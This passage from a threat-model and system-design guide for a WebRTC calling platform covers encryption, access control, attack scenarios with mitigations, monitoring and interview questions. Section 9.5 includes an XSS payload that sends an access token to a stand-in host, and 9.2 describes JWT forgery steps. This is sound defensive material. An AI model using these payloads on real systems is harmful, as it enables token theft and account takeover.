                            ├── reassemble RTP packets
                            ├── jitter buffer (hold packets, reorder, smooth delivery)
                            ├── decode (libvpx / hardware decoder)
                            └── render to canvas / video element
```

**Jitter buffer:** Packets arrive with variable delay (network jitter). The jitter buffer holds packets for a configured duration (target delay, e.g., 20-100ms) and releases them smoothly. Trade-off: higher buffer = smoother video but more latency. Adaptive jitter buffers dynamically tune this target.

### 6.3 Data Transformation Points

| Stage | Format | Who transforms |
|-------|--------|----------------|
| Camera capture | Raw YUV frames | Browser/OS |
| Video encoding | VP8/VP9/H264 bitstream | WebRTC engine (libvpx etc.) |
| RTP packetization | RTP packets | WebRTC engine |
| SRTP encryption | Encrypted UDP payload | WebRTC engine |
| Network transit | IP/UDP frames | OS network stack |
| SRTP decryption | RTP packets | WebRTC engine (receiver) |
| Jitter buffering | Reordered RTP | WebRTC engine |
| Video decoding | YUV frames | WebRTC engine |
| Rendering | RGB pixels | Browser compositor |

### 6.4 Recording Data Flow (if applicable)

When recording is enabled, the SFU decodes and re-encodes (or routes raw RTP) to a recording service:

```
SFU → RTP packets → Recording Service → 
  1. Decode audio/video
  2. Mux into container format (WebM or MP4)
  3. Encrypt with AES-256-GCM (using KMS-managed key)
  4. Upload to S3 multipart upload
  5. Store S3 key + KMS key reference in DB
```

---

## 7. Security Controls

### 7.1 Encryption In Transit

**Layer by layer:**

| Layer | Protocol | What's Protected |
|-------|----------|-----------------|
| DNS | DoH/DoT (if configured) | Query confidentiality |
| Signaling | TLS 1.3 + WebSocket | All signaling messages |
| REST API | TLS 1.3 | All API traffic |
| Media | SRTP (DTLS-SRTP) | Audio/video content |
| Internal services | mTLS | Service-to-service calls |
| Browser localStorage | N/A | Nothing sensitive stored there |

**DTLS-SRTP key material derivation:**

```
DTLS master secret
    → PRF_SRTP(label="EXTRACTOR-dtls_srtp", context, length)
    → client_write_SRTP_master_key (16 or 32 bytes)
    → client_write_SRTP_master_salt (14 bytes)
    → server_write_SRTP_master_key
    → server_write_SRTP_master_salt
```

Each key+salt is fed into an SRTP crypto context (AES-128-CM or AES-256-GCM) that generates per-packet keys via a key derivation function (KDF) using packet index.

### 7.2 Encryption At Rest

| Data | Storage | Encryption |
|------|---------|-----------|
| User passwords | PostgreSQL | Argon2id (not reversible) |
| Call recordings | S3 | AES-256-GCM, KMS-managed key |
| Database | EBS/storage | AES-256 (disk-level) |
| Redis cache | Memory | Disk snapshots: AES-256 |
| Refresh tokens | Redis | Only hash stored, not plaintext |

**KMS (Key Management Service):** Recordings use envelope encryption. A data encryption key (DEK) encrypts the file. The DEK itself is encrypted by a master key in KMS (AWS KMS / HashiCorp Vault). To decrypt a recording: fetch encrypted DEK from metadata, call KMS to decrypt DEK, use DEK to decrypt file. KMS maintains audit logs of every decryption.

### 7.3 Input Validation

Every input boundary performs validation:

**Signaling server:**
- SDP validation: parse SDP, check codec names against whitelist, reject unknown attributes that could cause parser bugs
- JSON schema validation on all WebSocket messages
- Maximum message size enforced (e.g., 64KB)
- Rate limiting on messages per second per connection

**REST API:**
- Request body schema validation (Zod/Joi in Node.js, Pydantic in Python)
- Path parameter validation (UUID format check before DB query)
- Query parameter allowlisting
- Content-Type enforcement (reject `multipart/form-data` where JSON expected)
- Request size limits (e.g., 1MB body limit)

**SQL query parameterization:** All DB queries use prepared statements/parameterized queries. No string concatenation to build SQL.

### 7.4 Access Control

**RBAC (Role-Based Access Control):**
- `user`: can create rooms, join rooms they're invited to, manage own data
- `host`: can mute others, remove participants, end call, manage recording
- `admin`: can access all rooms, user management, billing

**Resource-level authorization checks (not just role):** Checking that a user has the `user` role is not enough. Must also check they are a participant in the specific room they're acting on.

**Example check before muting a participant:**
```
1. Verify JWT (valid signature, not expired)
2. Extract user_id, role
3. Check room_participants: is requesting user in this room?
4. Check requesting user's role in this room (host or admin)
5. Check target user is in this room
6. Execute mute
```

Skipping step 3 or 4 leads to IDOR (Insecure Direct Object Reference) or privilege escalation.

### 7.5 Secrets Handling

- Secrets (DB passwords, API keys, TURN shared secret) stored in HashiCorp Vault or AWS Secrets Manager — never in code, environment files committed to git, or CloudFormation/Terraform plaintext
- Applications fetch secrets at startup via authenticated Vault API (using Kubernetes service account JWT or AWS IAM role)
- Secret rotation: TURN secret rotated every 24h, DB password rotated every 90 days (with zero-downtime double-key period)
- JWT signing keys (RSA 2048-bit minimum) stored in HSM or KMS — private key never leaves hardware
- Build artifacts scanned for secrets (trufflehog, gitleaks) in CI pipeline

---

## 8. Attack Surface Mapping

### 8.1 Entry Points Diagram

```
                          ┌──────────────────────────────────┐
  EXTERNAL ATTACK SURFACE │                                  │
  ══════════════════════  │                                  │
                          │   [A] calls.example.com:443      │
  Network-level:          │       (HTTPS / WebSocket)        │
  ─────────────           │                                  │
  [A] HTTPS REST API      │   [B] stun.example.com:3478      │
  [B] STUN server (UDP)   │       (UDP - unauthenticated)    │
  [C] TURN server (UDP)   │                                  │
  [D] WebSocket signaling │   [C] turn.example.com:3478      │
  [E] Browser JavaScript  │       (UDP/TCP - authenticated)  │
  [F] WebRTC media path   │                                  │
                          │   [D] wss://calls.example.com/ws │
  Application-level:      │       (WebSocket)                │
  ─────────────────       │                                  │
  [G] SDP injection       │   [E] Browser JS (untrusted env) │
  [H] ICE candidate abuse │                                  │
  [I] Signaling relay     │   [F] UDP media path (direct)   │
  [J] JWT forgery/theft   └──────────────────────────────────┘
  [K] Room ID enumeration
  [L] Recording access                                        
  [M] API parameter tampering                                 

                          ┌──────────────────────────────────┐
  INTERNAL ATTACK SURFACE │                                  │
  ══════════════════════  │   [N] Signaling ↔ Redis          │
                          │   [O] API ↔ PostgreSQL           │
  [N] Redis               │   [P] Services ↔ Kafka           │
  [O] PostgreSQL          │   [Q] SFU ↔ recording service    │
  [P] Kafka               │   [R] Secrets in env / disk      │
  [Q] SFU                 │   [S] Container escape           │
  [R] Secret stores       │   [T] K8s API server             │
  [S] Container runtime   │                                  │
  [T] Kubernetes API      └──────────────────────────────────┘
```

### 8.2 Trust Boundary Map

```
════════════════════════════════════════════════════════════════
ZONE: Untrusted (Internet)
  - All user browsers
  - All WebRTC peers (even "authenticated" users)
  - STUN/TURN external clients

  ▼ TLS boundary + JWT validation
════════════════════════════════════════════════════════════════
ZONE: Semi-trusted (API Gateway perimeter)
  - Requests with valid JWT
  - WebSocket connections with valid session

  ▼ mTLS + service mesh authorization
════════════════════════════════════════════════════════════════
ZONE: Trusted (Internal services)
  - Microservices with valid client certificates
  - Database connections from known services

  ▼ Network policy + HSM
════════════════════════════════════════════════════════════════
ZONE: Highly trusted (Secrets / Data plane)
  - KMS / Vault
  - PostgreSQL master
  - Encryption keys
════════════════════════════════════════════════════════════════
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 Attack: SDP Injection / Manipulation

**Attacker assumptions:**
- Attacker has a valid account on the platform
- Attacker can modify the SDP before it is sent (via browser DevTools, proxy, or a custom client)
- No SDP content validation on the signaling server

**Step-by-step execution:**

1. Attacker creates a normal RTCPeerConnection and generates a valid offer SDP.

2. Attacker intercepts the SDP before it is sent to the signaling server (e.g., via a browser extension or proxy like Burp Suite).

3. Attacker modifies the SDP:
   - **ICE candidate injection:** Adds `a=candidate` lines pointing to an internal server IP (e.g., `192.168.1.1`). If the victim's browser tests this candidate, it sends STUN binding requests to an internal host, potentially revealing its existence (SSRF-like via ICE).
   - **Codec downgrade:** Removes strong codecs, leaving only a known-vulnerable one.
   - **DTLS fingerprint swap:** Replaces the fingerprint with one belonging to an attacker-controlled certificate. If the victim accepts this, attacker could MITM the media — but only if they can also intercept the UDP path.

4. Attacker sends the manipulated SDP via the signaling server.

**Where detection could happen:**
- Signaling server SDP parser rejects malformed or unexpected attributes
- Firewall blocks STUN connectivity checks to internal IP ranges (RFC 1918 addresses)
- DTLS fingerprint mismatch causes the connection to fail (WebRTC spec requires failure on fingerprint mismatch — this is the saving grace)

**Why the DTLS fingerprint attack fails in practice:** The browser that receives the manipulated SDP will attempt to establish DTLS with whatever server is at the ICE-negotiated IP. That server must present a certificate whose fingerprint matches what's in the SDP. The attacker does not have the private key corresponding to their injected fingerprint — the legitimate server's private key — so the DTLS handshake fails. The connection is aborted. Media cannot be intercepted this way without also compromising the signaling channel AND performing a real-time MITM on the UDP path simultaneously.

**Residual risk:** The ICE SSRF vector is real. RFC 1918 addresses in ICE candidates can probe internal services if the signaling server blindly relays them and the peer's browser has network access to those hosts.

**Mitigation:** Validate ICE candidates on the signaling server; reject RFC 1918 addresses from external clients; use ICE candidate filters in browser (`iceTransportPolicy: 'relay'` to force TURN-only, preventing direct IP exposure).

---

### 9.2 Attack: JWT Algorithm Confusion (alg:none / HS256 Downgrade)

**Attacker assumptions:**
- Attacker has obtained an expired JWT (e.g., from browser memory via XSS, from a log file, from a JWT stored insecurely)
- The server does not strictly enforce algorithm type

**Step-by-step execution:**

1. Attacker decodes the JWT (base64url decode header + payload). No key needed for decoding — JWTs are not encrypted by default.

2. **Attack variant A (alg:none):** Attacker modifies header to `{"alg":"none"}`, changes `exp` claim to a future time, changes `sub` to a victim's user ID. Removes the signature. Sends as `header.payload.` (empty signature). If the server accepts `alg:none`, it skips signature verification entirely.

3. **Attack variant B (RS256 → HS256 confusion):** The server verifies RS256 with its RSA public key. Public keys are, by definition, public. Attacker downloads the public key (often exposed at `/.well-known/jwks.json`). Modifies JWT header to `{"alg":"HS256"}`. Signs the manipulated payload with HMAC-SHA256 using the RSA public key bytes as the HMAC secret. If the server's JWT library naively uses the public key material for HMAC verification when `alg=HS256` is specified by the token itself, it will verify successfully with the attacker's HMAC.

**Where detection could happen:**
- Proper JWT libraries require the algorithm to be specified server-side, not taken from the token header
- `alg:none` is explicitly rejected
- Signature verification failure logged and alerted

**Why this works (in vulnerable implementations):** Some JWT libraries had the `verify(token, key)` function accept any algorithm specified in the token's header, without requiring the caller to specify which algorithm to expect. This is now widely patched, but older or custom implementations may still be vulnerable.

**Mitigation:** Always specify the expected algorithm on the server side: `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. Reject tokens with `alg:none`. Never use the algorithm from the token itself.

---

### 9.3 Attack: TURN Server Abuse (Bandwidth Amplification)

**Attacker assumptions:**
- Attacker has a valid account (or has stolen TURN credentials)
- TURN credentials are long-lived or not properly rate-limited

**Step-by-step execution:**

1. Attacker authenticates to the platform and obtains TURN credentials (username + HMAC credential).

2. Attacker uses the TURN protocol directly (not via WebRTC) to allocate relay endpoints. Each allocation consumes server resources and a UDP port.

3. Attacker creates thousands of allocations using the same credential (or distributes across many accounts).

4. Attacker sends high-bandwidth UDP traffic to the allocated TURN relay, which faithfully forwards it to a target IP. The TURN server's upstream bandwidth and compute are consumed.

5. If the TURN server has no rate limiting, the attacker has effectively turned it into a UDP amplification / relay attack tool.

**Where detection could happen:**
- TURN server rate limits allocations per credential per second
- TURN server monitors total bandwidth per allocation and kills runaway sessions
- TURN credential lifetime is short (5 minutes) and tied to specific room/session
- Monitoring detects anomalous allocation count from single credential

**Why this works:** The TURN protocol is designed to relay arbitrary UDP data. Without rate limiting and proper credential scoping, any valid credential grants significant relay capability.

**Mitigation:** TURN credentials scoped to specific room sessions (encoded in username), short TTL (5 minutes), per-credential bandwidth limits, per-credential allocation limits, real-time monitoring of TURN bandwidth consumption.

---

### 9.4 Attack: Room Takeover via IDOR

**Attacker assumptions:**
- Attacker is an authenticated user
- Room IDs are guessable (e.g., sequential integers) or the attacker knows a room ID
- Authorization check is missing on some room management endpoints

**Step-by-step execution:**

1. Alice creates room `550e8400-e29b-41d4-a716-446655440001`. Attacker (Mallory) observes the room ID from a meeting invite link.

2. Mallory has never been invited to this room. Her join_token is for a different room.

3. Mallory calls `POST /api/rooms/550e8400-e29b-41d4-a716-446655440001/end` directly, without a valid join_token for that room — relying on her general user JWT.

4. If the endpoint only checks "is user authenticated" but not "is user the host of THIS room," the call is ended.

5. Further IDOR: `GET /api/rooms/{room_id}/recording` exposes recording download URL to any authenticated user if room-level auth is not checked.

**Where detection could happen:**
- Anomaly detection: user accessing rooms they have no record of joining
- 403 response rate monitoring per user
- SIEM alert on attempts to access N different room IDs from same user in short window

**Why this works:** Developers often add authentication (is the user logged in?) but forget authorization (does this specific user have permission for this specific resource?). This is one of the most common web application vulnerabilities (OWASP A01:2021).

**Mitigation:** Every resource endpoint checks both authentication AND resource-level authorization. Centralize authorization logic (don't scatter permission checks across handlers). Use UUIDs (not sequential integers) for room IDs — not a security control, but raises the bar for enumeration. Log all 403s with user + resource context.

---

### 9.5 Attack: XSS → Access Token Theft

**Attacker assumptions:**
- A stored XSS vulnerability exists in a user-controlled field (e.g., meeting room name, user display name)
- The access token is stored in a JavaScript-accessible location (e.g., Vuex state, window variable — not HttpOnly cookie)

**Step-by-step execution:**

1. Attacker creates a room with name: `<img src=x onerror="fetch('https://evil.com/?t='+window.__store.accessToken)">`

2. The room name is stored in the DB. When any user views the room listing, the HTML is rendered. If the server does not properly HTML-encode the room name before inserting it into the page, the script executes in the victim's browser context.

3. The `fetch()` call sends the access token to the attacker's server. The attacker now has a valid access token.

4. The attacker uses the token to make API calls as the victim for the next 15 minutes (until expiry). If the attacker can call the token refresh endpoint (which requires the refresh cookie — not accessible via JS thanks to HttpOnly), they cannot extend access. The 15-minute window is the blast radius.

**Where detection could happen:**
- Content Security Policy (CSP) with strict `script-src` would block the `fetch()` to an unauthorized origin
- Output encoding prevents the `<img>` tag from being interpreted as HTML
- Anomaly detection: API calls from new IP using victim's token

**Why this works:** XSS is the most common client-side vulnerability. Even modern frameworks (React, Vue) have escape hatches (`dangerouslySetInnerHTML`, `v-html`) that developers misuse.

**Mitigation:**
- Output encoding: always HTML-encode user-generated content before rendering
- CSP: `Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://api.example.com`
- Store access token in memory only — not localStorage, not non-HttpOnly cookies
- Short token lifetime (15 minutes) limits window of attack

---

### 9.6 Attack: Signaling Server DoS via WebSocket Flood

**Attacker assumptions:**
- The signaling server accepts WebSocket connections from authenticated users
- No per-connection message rate limit exists
- The attacker has a valid account (or multiple)

**Step-by-step execution:**

1. Attacker establishes a WebSocket connection with a valid JWT.

2. Attacker sends 10,000 signaling messages per second (ICE candidates, offer/answer re-negotiation messages). Each message is valid JSON and passes schema validation.

3. The signaling server processes each message: JSON parse, schema validate, Redis pub/sub publish. At high volume, Redis connection pool exhaustion, CPU saturation, or memory exhaustion occurs.

4. Legitimate users experience connection drops, failed calls, signaling timeouts.

**Where detection could happen:**
- Per-connection message rate counter (Redis INCR with TTL)
- Circuit breaker on Redis connection pool
- Horizontal pod autoscaler (HPA) detects high CPU and scales pods — but scaling takes time
- Per-IP WebSocket connection limit at load balancer

**Why this works:** WebSockets are persistent and high-throughput. Rate limiting at the HTTP layer does not directly apply post-upgrade. Each message is individually cheap to forge (a small valid JSON blob), but collectively overwhelming.

**Mitigation:** Per-connection rate limit (e.g., 100 messages/second, enforced in memory on the server node). Per-user rate limit across all connections. Circuit breakers. Maximum concurrent connections per user. Automated IP ban on violation.

---

## 10. Failure Points

### 10.1 Failures Under Load

**Signaling server — WebSocket connection limit:**
- Each WebSocket connection is a file descriptor. Linux default `ulimit -n` is often 1024. Production should be set to 1,000,000+.
- Node.js single-threaded: CPU-bound tasks (JSON parsing at high volume, large SDP processing) block the event loop, causing latency spikes for all connections.
- Symptom: calls start failing across the board; no obvious error; connection timeouts.

**Redis — Hot key problem:**
- A viral 10,000-person call creates one room participant Redis set that every join/leave operation touches.
- Redis is single-threaded per key. All operations on `room:{id}:participants` serialize.
- Symptom: Redis latency spikes, SLOWLOG entries, timeout errors in services.
- Fix: Shard large rooms across multiple Redis keys; use Redis Cluster with key hashing.

**SFU — Bandwidth exhaustion:**
- SFU upstream bandwidth is finite. 1000 participants, each uploading 2 Mbps video = 2 Gbps of ingress to the SFU.
- If SFU NIC is saturated, packet loss increases, video quality degrades, feeds freeze.
- Symptom: network interface saturation metrics spike; participants see frozen video.

**PostgreSQL — Connection pool exhaustion:**
- PgBouncer in session mode: each application "connection" holds a real DB connection.
- 500 app servers × 10 connections each = 5000 connections. PostgreSQL default max_connections = 100.
- Symptom: `FATAL: remaining connection slots are reserved` errors; all DB-dependent requests fail.
- Fix: PgBouncer in transaction mode (connection returned to pool between transactions); or increase max_connections with connection pooler.

**TURN server — Port exhaustion:**
- Each TURN allocation uses a UDP port (range typically 49152-65535 = ~16K ports).
- In a 10,000-person call all using TURN, 10,000 allocations needed per TURN server.
- Symptom: TURN allocation failures; ICE connectivity fails; calls fall back to P2P if possible, or fail.
- Fix: Multiple TURN servers behind DNS round-robin; port range expansion; enforce TURN usage only when necessary.

### 10.2 Failures Under Attack

**CPU exhaustion via large SDP:**
- SDP is a text format. An attacker can send an SDP with 10,000 `a=` attribute lines, each requiring parsing.
- If the parser has O(n²) behavior, CPU spikes. The connection blocks other connections on the same thread.
- Fix: Max SDP size limit (e.g., 64KB); parser complexity limits.

**Memory exhaustion via open connections:**
- WebSocket connections hold state in memory. Attacker opens 100,000 connections and leaves them idle (past authentication, so rate limits on new connections don't help).
- Symptom: OOM kill of signaling server pods.
- Fix: Max concurrent connections per IP (even for authenticated users); memory limits per connection; aggressive idle timeout.

**Redis DoS via key proliferation:**
- Attacker creates 1,000,000 rooms (if no creation rate limit). Each creates Redis keys.
- Redis memory fills; eviction policy kicks in and evicts active session keys, causing auth failures.
- Fix: Room creation rate limits; Redis `maxmemory-policy allkeys-lru` with sufficient memory allocation; separate Redis instances for volatile (sessions) and stable (rooms) data.

### 10.3 Common Misconfigurations

| Misconfiguration | Effect | Detection |
|-----------------|--------|-----------|
| TURN credentials never expire | Bandwidth abuse for life of credential | Audit TURN credential TTL |
| `iceTransportPolicy` not set | Leaks real IP even when TURN intended | Code review |
| SDP not validated | ICE SSRF, parser DoS | Penetration test |
| JWT `alg` not pinned server-side | Algorithm confusion attacks | JWT library audit |
| Refresh token in localStorage | XSS can steal and persist access indefinitely | Security code review |
| STUN server open to internet without rate limit | DDoS amplification tool | Network audit |
| mTLS not enforced on internal services | Compromised pod can call any service | Service mesh audit |
| PostgreSQL `max_connections` defaults | Connection starvation under load | Load test |
| Missing `SameSite=Strict` on refresh cookie | CSRF-assisted token theft | Cookie audit |
| Recording S3 bucket public | All recordings exposed | S3 bucket policy audit |

---

## 11. Mitigations

### 11.1 Defense-in-Depth Strategy

```
Layer 1: Network perimeter
  - DDoS protection (Cloudflare Magic Transit, AWS Shield Advanced)
  - Ingress firewall: allow only 443/tcp and 3478/udp (STUN/TURN)
  - Egress filtering: internal services cannot initiate external connections

Layer 2: Protocol hardening
  - TLS 1.3 only (disable 1.0, 1.1, 1.2 where possible)
  - Strong cipher suites: ECDHE + AES-256-GCM or CHACHA20-POLY1305
  - HSTS with long max-age + includeSubDomains + preload
  - DTLS 1.2+ for media (DTLS 1.3 support being standardized)
  - DNSSEC + DoH for DNS

Layer 3: Application authentication
  - RS256 JWT with short expiry (15 minutes)
  - HttpOnly Secure SameSite=Strict refresh cookies
  - Token binding to TLS session (WebTokenBinding) — emerging standard
  - MFA for account access

Layer 4: Authorization
  - RBAC + resource-level ownership checks on every request
  - Centralized authorization service (OPA - Open Policy Agent)
  - Audit log of all authorization decisions

Layer 5: Input validation
  - Schema validation at every input boundary
  - SDP content validation and sanitization
  - SQL parameterization everywhere (no raw queries)
  - Output encoding for all user-generated content
  - CSP headers to limit XSS blast radius

Layer 6: Secrets management
  - HSM-backed keys for JWT signing and recording encryption
  - Vault for all other secrets, short-TTL dynamic secrets
  - Secret rotation automation

Layer 7: Observability and response
  - Centralized logging with tamper-evident storage
  - Anomaly detection on auth patterns
  - Automated IP blocking for detected attacks
  - Incident response runbooks
```

### 11.2 Concrete Fixes with Engineering Tradeoffs

**Fix: Force DTLS fingerprint validation**
- What: Ensure browser enforces DTLS fingerprint check (it should by spec, but verify)
- Tradeoff: None — this is standard WebRTC behavior
- Implementation: No code change needed if using standards-compliant browser WebRTC; test with a MITM to verify

**Fix: SDP validation on signaling server**
- What: Parse incoming SDPs, validate codec names against whitelist, reject RFC 1918 ICE candidates from external clients
- Tradeoff: CPU cost of SDP parsing on server (~0.5ms per SDP); may reject edge cases with unusual but valid SDPs
- Implementation: Use a proper SDP parsing library (sdp-transform in Node.js); define allowlist of valid codec names, attribute names

**Fix: TURN credential scoping**
- What: Issue TURN credentials per call session, not per user. Encode room_id and expiry in username. TURN server validates.
- Tradeoff: More complex credential issuance; slightly more TURN server load per-request validation
- Implementation: `username = "{expiry_timestamp}:{room_id}:{user_id}"`, `credential = HMAC-SHA256(username, TURN_SECRET)`. TURN server re-derives HMAC and compares.

**Fix: WebSocket rate limiting**
- What: Per-connection message counter in memory; per-user rate in Redis; disconnect on violation
- Tradeoff: Legitimate clients sending bursts (ICE candidates) may be throttled; tune limits accordingly (ICE gathering can emit 10-20 candidates rapidly — allow burst, then steady-state limit)
- Implementation: Token bucket algorithm per connection: `tokens = min(capacity, tokens + rate * elapsed_seconds); if tokens >= 1: tokens--; process_message(); else: drop_or_disconnect()`

---

## 12. Observability

### 12.1 Logs

Every service should emit structured logs (JSON format) with a consistent schema:

```json
{
  "timestamp": "2024-01-01T12:00:00.123Z",
  "level": "INFO",
  "service": "signaling-service",
  "version": "2.3.1",
  "trace_id": "8f3a1b2c-...",
  "span_id": "4d5e6f7a-...",
  "user_id": "550e8400-...",
  "room_id": "a716-...",
  "event": "peer_connected",
  "peer_count": 3,
  "ice_candidate_type": "srflx",
  "duration_ms": 1243
}
```

**Log taxonomy:**

| Category | Examples | Retention |
|----------|----------|-----------|
| Auth events | login, logout, token refresh, failed auth | 90 days |
| Call events | room created, participant joined/left, call ended | 90 days |
| Error events | 5xx responses, exceptions, DB errors | 30 days |
| Security events | rate limit hit, invalid JWT, IP ban | 1 year |
| Media quality | packet loss %, jitter, RTT per peer | 7 days |
| Admin events | user deleted, role changed, recording accessed | 1 year |

**Log pipeline:** Application → Fluentd/Filebeat → Kafka → Elasticsearch → Kibana. Kafka acts as a buffer so log volume spikes don't overwhelm Elasticsearch ingest.

### 12.2 Metrics

**RED metrics (Rate, Errors, Duration) for each service:**

```
# Signaling service
signaling_ws_connections_active{node="pod-1"} 4523
signaling_ws_connections_total{result="success"} 18234
signaling_ws_connections_total{result="auth_failure"} 12
signaling_messages_per_second{type="offer"} 23.4
signaling_messages_per_second{type="candidate"} 412.1
signaling_message_processing_duration_p99_ms 4.2

# WebRTC quality (reported by clients via WebRTC stats API)
webrtc_packet_loss_ratio{direction="inbound"} 0.002
webrtc_jitter_ms{direction="inbound"} 8.3
webrtc_round_trip_time_ms 43.2
webrtc_available_outbound_bitrate_bps 2400000

# TURN server
turn_allocations_active 3421
turn_bandwidth_bytes_per_second{direction="inbound"} 4200000000
turn_allocation_failures_total 14

# Auth service
auth_jwt_validations_per_second 1203
auth_jwt_validation_failures_total{reason="expired"} 234
auth_jwt_validation_failures_total{reason="invalid_signature"} 2
auth_login_duration_p99_ms 312
```

### 12.3 Distributed Tracing

Every request gets a `trace_id` (W3C Trace Context: `traceparent` header). All downstream calls propagate it. This allows reconstructing the full path of a single user action:

```
trace_id: 4bf92f3577b34da6a3ce929d0e0e4736

Span 1: API Gateway (2ms)
  └─ Span 2: Auth Service - JWT verify (1ms)
  └─ Span 3: Room Service - GET /rooms/123 (8ms)
       └─ Span 4: PostgreSQL query (5ms)
       └─ Span 5: Redis GET (0.8ms)
```

If a call fails or is slow, you pull the trace and see exactly where time was spent or where the error occurred. Without tracing, debugging distributed failures requires correlating logs across multiple services by timestamp.

### 12.4 Alerting Rules

**Should alert (page on-call):**
- Signaling service error rate > 1% for 5 minutes
- Auth service JWT validation failures > 100/minute (potential attack)
- TURN server bandwidth > 80% of capacity
- PostgreSQL connection pool utilization > 90%
- Redis memory usage > 85%
- Any 500 errors from auth endpoints
- Certificate expiry < 30 days
- Unexpected spike in room creation rate (> 10x baseline)

**Should NOT alert (log only):**
- Individual connection timeouts (expected in normal operation)
- Single JWT expiry errors (users simply need to refresh)
- STUN binding requests from unknown IPs (normal — STUN is semi-public)
- P99 latency occasional spikes within 2× normal range

**WebRTC client-side quality alerts (visible to user, not pager):**
- Packet loss > 5%: show "Poor connection" indicator
- RTT > 300ms: show "High latency" indicator
- Zero-bitrate video for > 3 seconds: show "Video paused" indicator

---

## 13. Scaling Considerations

### 13.1 Bottlenecks Analysis

**Signaling service — CPU (JSON processing, pub/sub):**
- Single Node.js process is CPU-bound at ~10,000 concurrent connections on a modern server
- Horizontal scaling: multiple pods, but requires Redis for shared state (connection registry)
- Vertical scaling: larger instances help up to the single-threaded CPU limit; cluster mode (Node.js cluster) allows using multiple CPUs

**TURN server — Network bandwidth:**
- TURN is a pure network relay; CPU is rarely the bottleneck
- Bandwidth is the bottleneck: 1 Gbps NIC × 40% overhead = ~600 Mbps usable
- Scaling: DNS-based load balancing across multiple TURN servers; each handles a subset of sessions
- Geographic distribution: TURN servers in each major region minimize relay latency

**SFU — Both CPU (encoding/decoding for recording) and network:**
- Forwarding-only SFU: network bottleneck (bandwidth of all incoming streams)
- Recording SFU: CPU bottleneck (decoding + muxing every stream)
- Scaling: horizontal sharding of rooms across SFU instances; consistent hashing to keep room on same instance; session migration on instance failure

**PostgreSQL — Read scalability:**
- Read replicas handle read traffic (room metadata, user lookups)
- Primary handles all writes
- Connection pooling via PgBouncer is mandatory in production
- Partitioning: `room_participants` by `joined_at` date range for archival efficiency

### 13.2 Horizontal vs Vertical Scaling

| Service | Horizontal | Vertical | Notes |
|---------|-----------|---------|-------|
| Signaling | Yes (with Redis coordination) | Limited (single-threaded) | Prefer horizontal |
| REST API | Yes (stateless) | Helpful | Easy horizontal |
| Auth service | Yes (stateless with shared key) | Helpful | Easy horizontal |
| TURN | Yes (DNS round-robin) | Less useful | Network-bound |
| SFU | Yes (room-based sharding) | Yes (for large rooms) | Both needed |
| PostgreSQL | Read replicas for reads | Yes for primary | Limited horizontal for writes |
| Redis | Cluster mode (sharding) | Yes | Cluster for large datasets |

### 13.3 Consistency Tradeoffs

**Room participant list (Redis vs PostgreSQL):**
- Redis: fast reads/writes, eventually consistent with DB (async write-through), risk of data loss on Redis failure
- PostgreSQL: authoritative, slower, always consistent
- Pattern: Write to Redis (fast, for real-time presence) AND queue async write to PostgreSQL (for billing, analytics). Accept that Redis might be slightly stale if a node crashes.

**Call metrics (write-heavy):**
- Don't write real-time WebRTC stats to PostgreSQL directly — too many writes
- Collect in memory on the SFU, batch flush to time-series DB (InfluxDB / TimescaleDB) every 5 seconds
- Accept that if SFU crashes, last 5 seconds of metrics are lost

**Session state:**
- Redis with replication to a replica. Read from primary for auth (must be fresh). Read from replica for non-critical lookups.
- Redis Sentinel or Cluster for automatic failover. Failover takes ~15-30 seconds during which auth may degrade.

---

## 14. Interview Questions

### Q1: Why does WebRTC use DTLS-SRTP instead of just TLS for media?

**Answer:** TLS is designed for TCP (stream-oriented, in-order delivery). Media is sent over UDP (unreliable, unordered). DTLS is TLS adapted for UDP: it adds sequence numbers, retransmission, and anti-replay to the handshake, but the data plane (after handshake) uses SRTP — not the TLS record layer — because SRTP is designed for real-time media. SRTP applies authentication (HMAC) and encryption (AES-CTR or AES-GCM) to RTP packets efficiently, with minimal overhead per packet, and handles the unique constraints of media: packet loss is expected and must not cause decryption failure for subsequent packets (unlike a stream cipher which would lose sync). The DTLS handshake derives the SRTP keys via a standard key exporter (RFC 5705), giving you the best of both worlds: a well-audited key exchange (DTLS) and an efficient real-time media encryption scheme (SRTP).

**Why:** Demonstrates understanding of why the layering choice was made, not just that it exists.

---

### Q2: How does ICE actually choose which candidate pair to use, and what determines priority?

**Answer:** ICE tests all candidate pairs (cross-product of local and remote candidates). Each candidate has a priority value computed from: candidate type (host=126, srflx=100, relay=0 — these are the RECOMMENDED preference values, not fixed), local preference (interface priority, e.g., Ethernet > WiFi > loopback), and component ID (1 for RTP, 2 for RTCP). The pair priority = 2^32 × min(G,D) + 2 × max(G,D) + (G>D ? 1 : 0) where G and D are the local and remote candidate priorities. ICE performs connectivity checks on pairs in priority order. The first pair where both sides succeed (send STUN, receive response) is nominated (the controlling agent nominates). If a higher-priority pair succeeds later, it replaces the nominated pair. In practice: direct host-to-host wins if both on the same network; server-reflexive wins for internet P2P; relay (TURN) wins as fallback. The choice is deterministic given the priorities.

**What if:** "What if the network changes mid-call?" ICE Connection Re-establishment (ICE restart): both sides generate new ICE credentials (`ice-ufrag`, `ice-pwd`), re-gather candidates, re-test pairs, and transparently switch to the new path. This is what enables WiFi-to-cellular handoff without dropping a call.

---

### Q3: An attacker intercepts the signaling channel completely and replaces both Alice's and Bob's SDPs. Can they decrypt the media stream?

**Answer:** No, not without additionally compromising the DTLS private keys. Here's why: The SDP contains a DTLS fingerprint — the SHA-256 hash of the DTLS certificate's public key (DER encoded). When Alice's browser performs the DTLS handshake over the ICE-established UDP path, it checks that the certificate presented by the server matches the fingerprint in the SDP it received. If the attacker replaced Alice's SDP with one containing the attacker's fingerprint, and the attacker also performs a real-time MITM on the UDP path (intercepting between Alice and Bob and presenting their own DTLS certificate), the attacker CAN decrypt the media — but only if they also control the network path. If the attacker only controls signaling (the WebSocket server) but not the UDP path, DTLS will fail: Alice connects directly to Bob's IP (from ICE candidates), Bob presents his real certificate, and Alice's browser verifies it matches the fingerprint Bob put in his SDP — which the attacker can modify, but the DTLS presentation comes from Bob's server, not the attacker's. The attacker cannot make Bob's server present a certificate the attacker controls without also compromising Bob's machine. Conclusion: signaling compromise alone does not break media confidentiality. Full MITM requires both signaling compromise AND network-path control.

---

### Q4: Why use RS256 instead of HS256 for JWTs, and where exactly does the public key live?

